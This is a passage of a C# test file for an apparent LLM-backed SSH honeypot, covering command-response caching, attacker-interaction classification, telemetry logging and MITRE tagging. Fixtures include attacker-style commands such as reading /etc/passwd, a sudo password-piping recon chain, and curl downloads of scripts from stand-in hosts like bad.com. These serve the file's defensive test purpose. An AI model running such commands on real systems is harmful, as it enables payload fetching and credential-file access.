                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) => { calls++; return Task.FromResult(("unexpected", 1, 1, 2, "test-model")); });

            var reordered = await CommandResolver.ResolveCommandAsync(
                "hostname && nproc && uname -s && id",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) => { calls++; return Task.FromResult(("unexpected", 1, 1, 2, "test-model")); });

            Assert.Equal("Linux\r\nuid=1001(remote) gid=1001(users) groups=1001(users)\r\n96\r\nomegablack", firstOrder.response);
            Assert.Equal("compound cache", firstOrder.responseSource);
            Assert.Equal("omegablack\r\n96\r\nLinux\r\nuid=1001(remote) gid=1001(users) groups=1001(users)", reordered.response);
            Assert.Equal("compound cache", reordered.responseSource);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_CompoundOrAndShortCircuitAndVariableExpansionWorkInAnyOrder()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["uname -m"] = "x86_64",
            ["nproc"] = "96"
        });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;

            const string chain = "echo 'badpass' | sudo -S sh -c 'nproc 2>/dev/null' 2>/dev/null || cpus=$(/usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null); arch=$(/bin/uname -m 2>/dev/null); false && echo 'NEVER'; echo \"CPUS:$cpus\"; echo \"ARCH:$arch\"";
            var result = await CommandResolver.ResolveCommandAsync(
                chain,
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [],
                CancellationToken.None,
                (_, _) => { calls++; return Task.FromResult(("unexpected", 1, 1, 2, "test-model")); });

            Assert.Equal("CPUS:96\r\nARCH:x86_64", result.response);
            Assert.Equal("compound cache", result.responseSource);
            Assert.Equal(0, calls);
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Fact]
    public async Task ResolveCommand_LongHybridChainResolvesOnlyUncachedStepViaLlmAndCachesItForReorderedReuse()
    {
        var path = CreateStoreFile(new Dictionary<string, string>
        {
            ["uname -s"] = "Linux",
            ["nproc"] = "96",
            ["hostname"] = "omegablack",
            ["whoami"] = "remote"
        });
        try
        {
            Program.CommandResponses = CommandResponseStore.Load(path);
            var calls = 0;

            var first = await CommandResolver.ResolveCommandAsync(
                "uname -s; nproc; custom_probe --check; hostname; whoami",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [new ChatRequestData.ChatMessage { Role = "system", Content = "sys" }],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("probe-ok", 5, 2, 7, "step-model"));
                });

            Assert.Equal("Linux\r\n96\r\nprobe-ok\r\nomegablack\r\nremote", first.response);
            Assert.Equal("compound hybrid", first.responseSource);
            Assert.Equal(1, calls);
            Assert.True(Program.CommandResponses.TryGet("custom_probe --check", out var learnedStep));
            Assert.Equal("probe-ok", learnedStep.Response);

            var reordered = await CommandResolver.ResolveCommandAsync(
                "whoami && custom_probe --check && nproc && uname -s",
                "session",
                FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N")),
                [new ChatRequestData.ChatMessage { Role = "system", Content = "sys" }],
                CancellationToken.None,
                (_, _) =>
                {
                    calls++;
                    return Task.FromResult(("unexpected", 5, 2, 7, "step-model"));
                });

            Assert.Equal("remote\r\nprobe-ok\r\n96\r\nLinux", reordered.response);
            Assert.Equal("compound cache", reordered.responseSource);
            Assert.Equal(1, calls);
        }
        finally
        {
            File.Delete(path);
            File.Delete(path + ".tmp");
        }
    }

    [Fact]
    public void ClassifyExchangeInteraction_DistinguishesScriptedFromHandsOnKeyboardAndPaste()
    {
        var execClassification = DataHarvester.ClassifyExchangeInteraction(
            "uname -a",
            commandSequenceLatencyMs: 120,
            new CommandDeliveryMetrics { DeliveryChannel = "exec", ChunkCount = 1, TypingDurationMs = 0, BackspaceCount = 0 });
        Assert.Equal("scripted", execClassification);

        var botChainClassification = DataHarvester.ClassifyExchangeInteraction(
            "echo '123456' | sudo -S nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null",
            commandSequenceLatencyMs: 180,
            new CommandDeliveryMetrics { DeliveryChannel = "pty", ChunkCount = 1, TypingDurationMs = 2, BackspaceCount = 0 });
        Assert.Equal("scripted", botChainClassification);

        var humanTypedClassification = DataHarvester.ClassifyExchangeInteraction(
            "ls -la /home/remote",
            commandSequenceLatencyMs: 3400,
            new CommandDeliveryMetrics { DeliveryChannel = "pty", ChunkCount = 14, TypingDurationMs = 1850, BackspaceCount = 1 });
        Assert.Equal("hands_on_keyboard", humanTypedClassification);

        var pasteClassification = DataHarvester.ClassifyExchangeInteraction(
            "export PATH=/usr/local/bin:$PATH; uname -a && id && lscpu | grep 'Model name'",
            commandSequenceLatencyMs: 4200,
            new CommandDeliveryMetrics { DeliveryChannel = "pty", ChunkCount = 1, TypingDurationMs = 0, BackspaceCount = 0 });
        Assert.Equal("automated_paste", pasteClassification);

        var harnessClassification = DataHarvester.ClassifyExchangeInteraction(
            "cat /home/secretOps/mission_brief.txt && ls -la /home/secretOps",
            commandSequenceLatencyMs: 2100,
            new CommandDeliveryMetrics { DeliveryChannel = "pty", ChunkCount = 1, TypingDurationMs = 5, BackspaceCount = 0 },
            previousResponse: "drwxr-xr-x 2 secretOps secretOps 4096 mission_brief.txt");
        Assert.Equal("llm_harness", harnessClassification);
    }

    private static string CreateStoreFile(IReadOnlyDictionary<string, string> responses)
    {
        var path = Path.Combine(Path.GetTempPath(), $"funnypot-responses-{Guid.NewGuid():N}.json");
        var entries = responses.ToDictionary(
            pair => pair.Key,
            pair => new CommandResponseEntry
            {
                Response = pair.Value,
                Origin = "seed"
            },
            StringComparer.Ordinal);
        File.WriteAllText(path, System.Text.Json.JsonSerializer.Serialize(entries));
        return path;
    }
}

public class AppConfigurationTests
{
    [Fact]
    public void Load_WhenConfigMissing_ReturnsDefaults()
    {
        var config = AppConfiguration.Load("/tmp/non-existent-funnypot-config.yaml");

        Assert.Equal(22722, config.Ssh.Port);
        Assert.Equal(50, config.Ssh.MaxSessions);
        Assert.Equal(500, config.Llm.DelayMs);
    }

    [Fact]
    public void Load_WhenConfigExists_UsesFileValues()
    {
        var tempPath = Path.Combine(Path.GetTempPath(), $"funnypot-config-{Guid.NewGuid():N}.yaml");
        File.WriteAllText(tempPath, "ssh:\n  port: 23000\n  max-sessions: 10\nllm:\n  delay-ms: 250\n");

        try
        {
            var config = AppConfiguration.Load(tempPath);

            Assert.Equal(23000, config.Ssh.Port);
            Assert.Equal(10, config.Ssh.MaxSessions);
            Assert.Equal(250, config.Llm.DelayMs);
        }
        finally
        {
            File.Delete(tempPath);
        }
    }

    [Fact]
    public void Load_ProjectConfig_BindsRootSections()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../config/app-config.yaml"));

        var config = AppConfiguration.Load(path);

        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
        Assert.Contains("nvidia/nemotron-3-super-120b-a12b:free", config.Llm.FallbackModels);
        Assert.Equal("/var/log/funnypot", config.Logging.LogDir);
        Assert.Equal(3, config.Ssh.PasswordHarvestAttempt);
        Assert.Equal("/chat/completions", config.Api.OpenRouter.ChatEndpoint);
        Assert.Equal("data/command_responses.json", config.CommandResponses.DataPath);
        Assert.Equal("autoresearch/program.md", config.AutoResearch.ProgramPath);
        Assert.Equal("dotnet test FunnyPot.sln", config.AutoResearch.ExperimentCommand);
        Assert.Contains("FunnyPot/Program.cs", config.AutoResearch.MutablePaths);
    }

    [Fact]
    public void Load_DefaultPathPrefersPublishedConfiguration()
    {
        var config = AppConfiguration.Load();

        Assert.Equal(22722, config.Ssh.Port);
        Assert.Equal("openai/gpt-5.6-luna", config.Llm.Model);
    }

    [Fact]
    public void BuildOutput_IncludesDefaultConfiguration()
    {
        var path = Path.Combine(AppContext.BaseDirectory, "config", "app-config.yaml");

        Assert.True(File.Exists(path));
        Assert.Equal(22722, AppConfiguration.Load(path).Ssh.Port);
    }
}

public class TelemetryWriteQueueTests
{
    [Fact]
    public void CreateHarvestedEvent_UsesSessionSequenceAndLeanAuthData()
    {
        var sessionId = $"test-{Guid.NewGuid():N}";
        var timestamp = DateTime.SpecifyKind(new DateTime(2026, 1, 2, 3, 4, 5), DateTimeKind.Utc);
        var first = Logger.CreateHarvestedEvent("auth_attempt", new AuthAttemptLogEntry
        {
            Timestamp = timestamp,
            SessionKey = sessionId,
            RemoteEndpoint = "203.0.113.5:22",
            Username = "root",
            AuthMethod = "password",
            Password = "secret",
            ConnectionAttemptNumber = 3,
            Accepted = true,
            AcceptanceReason = "harvest_threshold"
        });
        var second = Logger.CreateHarvestedEvent("auth_attempt", new AuthAttemptLogEntry
        {
            Timestamp = timestamp,
            SessionKey = sessionId,
            RemoteEndpoint = "203.0.113.5:22",
            Username = "admin",
            AuthMethod = "password",
            Password = "password"
        });

        try
        {
            Assert.Equal(sessionId, first.SessionId);
            Assert.Equal(1, first.Sequence);
            Assert.Equal(2, second.Sequence);
            Assert.Equal(timestamp, first.Timestamp);
            var json = System.Text.Json.JsonSerializer.Serialize(first);
            Assert.DoesNotContain("CredentialEntropy", json);
            Assert.DoesNotContain("PreviousCredentialDistance", json);
            Assert.DoesNotContain("SessionKey", json);
        }
        finally
        {
            Logger.ResetSessionEventSequenceForTest(sessionId);
        }
    }

    [Fact]
    public void CreateHarvestedEvent_IncludesCommandDetailsAndExchangeId()
    {
        var sessionId = $"test-{Guid.NewGuid():N}";
        var exchangeId = $"ex-{Guid.NewGuid():N}";
        var timestamp = DateTime.SpecifyKind(new DateTime(2026, 1, 2, 3, 4, 5), DateTimeKind.Utc);
        var cmdEvent = Logger.CreateHarvestedEvent("command", new CommandLogEntry
        {
            Timestamp = timestamp,
            SessionKey = sessionId,
            ExchangeId = exchangeId,
            RemoteEndpoint = "203.0.113.5:22",
            Username = "root",
            MessageNumber = 1,
            ShellMessageNumber = 1,
            Command = "uname -a"
        });
        var resultEvent = Logger.CreateHarvestedEvent("command_result", new CommandResultLogEntry
        {
            Timestamp = timestamp,
            SessionKey = sessionId,
            ExchangeId = exchangeId,
            RemoteEndpoint = "203.0.113.5:22",
            Username = "root",
            MessageNumber = 1,
            ShellMessageNumber = 1,
            Command = "uname -a",
            Response = "Linux funnypot 5.4.0"
        });

        try
        {
            Assert.Equal(exchangeId, cmdEvent.ExchangeId);
            Assert.Equal(exchangeId, resultEvent.ExchangeId);
            var cmdJson = System.Text.Json.JsonSerializer.Serialize(cmdEvent);
            Assert.Contains("\"Command\":\"uname -a\"", cmdJson);
            var resultJson = System.Text.Json.JsonSerializer.Serialize(resultEvent);
            Assert.Contains("\"Command\":\"uname -a\"", resultJson);
            Assert.Contains("\"Response\":\"Linux funnypot 5.4.0\"", resultJson);
        }
        finally
        {
            Logger.ResetSessionEventSequenceForTest(sessionId);
        }
    }

    [Fact]
    public void RestorePublicationSnapshot_MergesEventsWithoutDeletingHistory()
    {
        var tempRepo = Path.Combine(Path.GetTempPath(), $"fp-test-repo-{Guid.NewGuid():N}");
        var tempSnapshot = Path.Combine(Path.GetTempPath(), $"fp-test-snap-{Guid.NewGuid():N}");
        try
        {
            var repoData = Path.Combine(tempRepo, "data");
            var snapData = Path.Combine(tempSnapshot, "data");
            Directory.CreateDirectory(repoData);
            Directory.CreateDirectory(snapData);

            File.WriteAllLines(Path.Combine(repoData, "events.jsonl"), new[] { "{\"Event\":\"session_start\",\"id\":\"1\"}", "{\"Event\":\"command\",\"id\":\"2\"}" });
            File.WriteAllLines(Path.Combine(snapData, "events.jsonl"), new[] { "{\"Event\":\"command\",\"id\":\"2\"}", "{\"Event\":\"session_end\",\"id\":\"3\"}" });
            File.WriteAllText(Path.Combine(repoData, "sessions.json"), "[{\"SessionId\":\"existing\",\"StartedAt\":\"2026-09-04T08:00:00Z\"}]");
            File.WriteAllText(Path.Combine(snapData, "sessions.json"), "[{\"SessionId\":\"snapshot\",\"StartedAt\":\"2026-09-04T09:00:00Z\"}]");

            Logger.RestorePublicationSnapshot(tempRepo, (tempSnapshot, HasStats: false, HasData: true));

            var mergedLines = File.ReadAllLines(Path.Combine(repoData, "events.jsonl"));
            Assert.Equal(3, mergedLines.Length);
            Assert.Contains("{\"Event\":\"session_start\",\"id\":\"1\"}", mergedLines);
            Assert.Contains("{\"Event\":\"command\",\"id\":\"2\"}", mergedLines);
            Assert.Contains("{\"Event\":\"session_end\",\"id\":\"3\"}", mergedLines);
            var mergedSessions = System.Text.Json.JsonSerializer.Deserialize<List<SessionDebrief>>(File.ReadAllText(Path.Combine(repoData, "sessions.json")));
            Assert.NotNull(mergedSessions);
            Assert.Equal(2, mergedSessions.Count);
            Assert.Contains(mergedSessions, session => session.SessionId == "existing");
            Assert.Contains(mergedSessions, session => session.SessionId == "snapshot");
        }
        finally
        {
            if (Directory.Exists(tempRepo)) Directory.Delete(tempRepo, true);
            if (Directory.Exists(tempSnapshot)) Directory.Delete(tempSnapshot, true);
        }
    }

    [Fact]
    public void InferCommandObjective_ReturnsSensibleClassifications()
    {
        var (obj1, tactic1, tech1) = Logger.InferCommandObjective("uname -a");
        Assert.Contains("kernel", obj1, StringComparison.OrdinalIgnoreCase);
        Assert.Equal("Discovery", tactic1);
        Assert.Contains("T1082", tech1);

        var (obj2, tactic2, tech2) = Logger.InferCommandObjective("cat /etc/passwd");
        Assert.Contains("account", obj2, StringComparison.OrdinalIgnoreCase);
        Assert.Equal("Credential Access", tactic2);
        Assert.Contains("T1087", tech2);

        var (obj3, tactic3, tech3) = Logger.InferCommandObjective("curl -O http://bad.com/x.sh");
        Assert.Contains("payload", obj3, StringComparison.OrdinalIgnoreCase);
        Assert.Equal("Command and Control", tactic3);
        Assert.Contains("T1105", tech3);
    }

    [Fact]
    public void RecalculatePublicationData_GeneratesAccurateSummaryAndSessions()
    {
        var tempRepo = Path.Combine(Path.GetTempPath(), $"fp-recalc-{Guid.NewGuid():N}");
        try
        {
            var dataDir = Path.Combine(tempRepo, "data");
            Directory.CreateDirectory(dataDir);
            var events = new[]
            {
                "{\"Timestamp\":\"2026-09-04T08:00:00Z\",\"Event\":\"session_start\",\"SessionId\":\"s1\",\"Sequence\":1,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\",\"ClientVersion\":\"pending\",\"SshBanner\":\"SSH-2.0-Test\"}}",
                "{\"Timestamp\":\"2026-09-04T08:00:01Z\",\"Event\":\"auth_attempt\",\"SessionId\":\"s1\",\"Sequence\":2,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\",\"Username\":\"root\",\"Password\":\"toor\",\"AuthMethod\":\"password\",\"ConnectionAttemptNumber\":3,\"Accepted\":true,\"AcceptanceReason\":\"harvest_threshold\"}}",
                "{\"Timestamp\":\"2026-09-04T08:00:02Z\",\"Event\":\"shell_session_start\",\"SessionId\":\"s1\",\"Sequence\":3,\"ChannelId\":\"ch1\",\"Data\":{\"Username\":\"root\",\"ClientVersion\":\"SSH-2.0-RealClient\",\"TimeToCompromiseMs\":200}}",
                "{\"Timestamp\":\"2026-09-04T08:00:03Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":4,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:1\",\"Data\":{\"MessageNumber\":1,\"ShellMessageNumber\":1,\"Command\":\"id\",\"CommandSequenceLatencyMs\":125,\"ActorAutomationHint\":\"automation\",\"SemanticComplexity\":1,\"AssetValuePerceptionScore\":4,\"MitreAttackTechniques\":[\"Discovery\"]}}",
                "{\"Timestamp\":\"2026-09-04T08:00:04Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":5,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:2\",\"Data\":{\"MessageNumber\":2,\"ShellMessageNumber\":2,\"Command\":\"curl http://bad.test/x.sh\",\"PayloadUrls\":[\"http://bad.test/x.sh\"],\"EgressTargets\":[\"bad.test\"],\"PersistenceVector\":\"cron\",\"MitreAttackTechniques\":[\"Command and Control\"]}}",
                "{\"Timestamp\":\"2026-09-04T08:00:05Z\",\"Event\":\"command_result\",\"SessionId\":\"s1\",\"Sequence\":6,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:2\",\"Data\":{\"MessageNumber\":2,\"Command\":\"curl http://bad.test/x.sh\",\"Response\":\"blocked\",\"ResponseDurationMs\":50,\"PromptTokens\":12,\"CompletionTokens\":3,\"BlockedOperation\":true,\"FailedCommand\":true,\"ResponseSource\":\"input validation\"}}",
                "{\"Timestamp\":\"2026-09-04T08:00:06Z\",\"Event\":\"shell_session_end\",\"SessionId\":\"s1\",\"Sequence\":7,\"ChannelId\":\"ch1\",\"Data\":{\"Username\":\"root\",\"ClientVersion\":\"SSH-2.0-RealClient\",\"SshBanner\":\"SSH-2.0-Test\",\"DurationSeconds\":6.0}}",
                "{\"Timestamp\":\"2026-09-04T08:00:07Z\",\"Event\":\"session_end\",\"SessionId\":\"s1\",\"Sequence\":8,\"Data\":{\"DurationSeconds\":7.0}}"
            };
            File.WriteAllLines(Path.Combine(dataDir, "events.jsonl"), events);

            Logger.RecalculatePublicationData(tempRepo, "test");

            Assert.True(File.Exists(Path.Combine(dataDir, "events_summary.json")));
            Assert.True(File.Exists(Path.Combine(tempRepo, "global_stats.json")));
            Assert.True(File.Exists(Path.Combine(dataDir, "sessions.json")));

            var summary = System.Text.Json.JsonSerializer.Deserialize<HarvestSummary>(File.ReadAllText(Path.Combine(dataDir, "events_summary.json")));
            Assert.NotNull(summary);
            Assert.Equal(8, summary.TotalEvents);
            Assert.Equal(1, summary.TotalShells);
            Assert.Equal(2, summary.EventCounts["command"]);
            Assert.Equal(1, summary.TotalScanAttempts);
            Assert.Equal(1, summary.ScansByIp["1.2.3.4"]);

            var stats = System.Text.Json.JsonSerializer.Deserialize<GlobalStats>(File.ReadAllText(Path.Combine(tempRepo, "global_stats.json")));
            Assert.NotNull(stats);
            Assert.Equal(1, stats.TotalSessions);
            Assert.Equal(2, stats.TotalCommands);
            Assert.Equal(1, stats.TotalBlockedOperations);
            Assert.Equal(12, stats.TotalPromptTokens);
            Assert.Equal(3, stats.TotalCompletionTokens);
            Assert.Equal(1, stats.TopUsers["root"]);
            Assert.Equal(1, stats.SessionsByBanner["SSH-2.0-Test"]);

            var sessions = System.Text.Json.JsonSerializer.Deserialize<List<SessionDebrief>>(File.ReadAllText(Path.Combine(dataDir, "sessions.json")));
            Assert.NotNull(sessions);
            Assert.Single(sessions);
            Assert.Equal("s1", sessions[0].SessionId);
            Assert.True(sessions[0].AuthAccepted);
            Assert.Equal("SSH-2.0-RealClient", sessions[0].ClientVersion);
            Assert.Equal(8, sessions[0].Timeline.Count);
            Assert.Equal(2, sessions[0].Commands.Count);
            Assert.False(sessions[0].Commands[0].HasResponse);
            Assert.Equal("id", sessions[0].Commands[0].Command);
            Assert.Equal(125, sessions[0].Commands[0].CommandSequenceLatencyMs);
            Assert.Equal("automation", sessions[0].Commands[0].ActorAutomationHint);
            Assert.True(sessions[0].Commands[1].HasResponse);
            Assert.Equal("blocked", sessions[0].Commands[1].Response);
            Assert.Equal(DateTime.Parse("2026-09-04T08:00:05Z").ToUniversalTime(), sessions[0].Commands[1].ResponseTimestamp);
            Assert.Equal("ch1", sessions[0].Commands[1].ChannelId);
            Assert.Contains("bad.test", sessions[0].Commands[1].EgressTargets);
            Assert.Equal("cron", sessions[0].Commands[1].PersistenceVector);
        }
        finally
        {
            if (Directory.Exists(tempRepo)) Directory.Delete(tempRepo, true);
        }
    }

    [Fact]
    public void TryEnqueue_ProcessesWritesBeforeDispose()
    {
        using var queue = new TelemetryWriteQueue();
        using var completed = new ManualResetEventSlim(false);

        Assert.True(queue.TryEnqueue(completed.Set));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
    }

    [Fact]
    public void TryEnqueue_ReturnsFalseAfterDispose()
    {
        var queue = new TelemetryWriteQueue();
        queue.Dispose();

        Assert.False(queue.TryEnqueue(() => { }));
    }
}

public class AutoResearchRunnerTests
{
    [Theory]
    [InlineData("autoresearch_metric=42", 42)]
    [InlineData("before\nautoresearch_metric = -1.25\nafter", -1.25)]
    public void TryParseMetric_ReadsNamedValueGroup(string output, double expected)
    {
        var parsed = AutoResearchRunner.TryParseMetric(output, @"autoresearch_metric\s*=\s*(?<value>-?\d+(?:\.\d+)?)", out var metric);

        Assert.True(parsed);
        Assert.Equal(expected, metric);
    }

    [Theory]
    [InlineData(2.0, null, false, true)]
    [InlineData(2.0, 1.0, false, true)]
    [InlineData(1.0, 2.0, false, false)]
    [InlineData(1.0, 2.0, true, true)]
    [InlineData(2.0, 1.0, true, false)]
    public void IsImprovement_RespectsMetricDirection(double candidate, double? best, bool lowerIsBetter, bool expected)
    {
        Assert.Equal(expected, AutoResearchRunner.IsImprovement(candidate, best, lowerIsBetter));
    }

    [Fact]
    public void ValidateMutablePaths_AllowsOnlyPathsInsideWorktree()
    {
        var worktree = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));

        AutoResearchRunner.ValidateMutablePaths(worktree, new[] { "FunnyPot/Program.cs", "autoresearch/program.md" });

        Assert.Throws<InvalidOperationException>(() => AutoResearchRunner.ValidateMutablePaths(worktree, new[] { "../outside.cs" }));
    }
}

public class SessionCommandWorkerTests
{
    [Fact]
    public void TryPost_RunsWorkOnDedicatedThreadInOrder()
    {
        using var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        using var completed = new ManualResetEventSlim(false);
        var order = new List<int>();
        var executingThreadId = 0;

        Assert.True(worker.TryPost(() =>
        {
            executingThreadId = Environment.CurrentManagedThreadId;
            order.Add(1);
        }));
        Assert.True(worker.TryPost(() => order.Add(2)));
        Assert.True(worker.TryPost(() =>
        {
            order.Add(3);
            completed.Set();
        }));

        Assert.True(completed.Wait(TimeSpan.FromSeconds(2)));
        Assert.Equal(new[] { 1, 2, 3 }, order);
        Assert.Equal(worker.WorkerThreadId, executingThreadId);
        Assert.NotEqual(Environment.CurrentManagedThreadId, executingThreadId);
    }

    [Fact]
    public void TryPost_ReturnsFalseAfterDispose()
    {
        var worker = new SessionCommandWorker(Guid.NewGuid().ToString("N"));
        worker.Dispose();

        Assert.False(worker.TryPost(() => { }));
    }
}
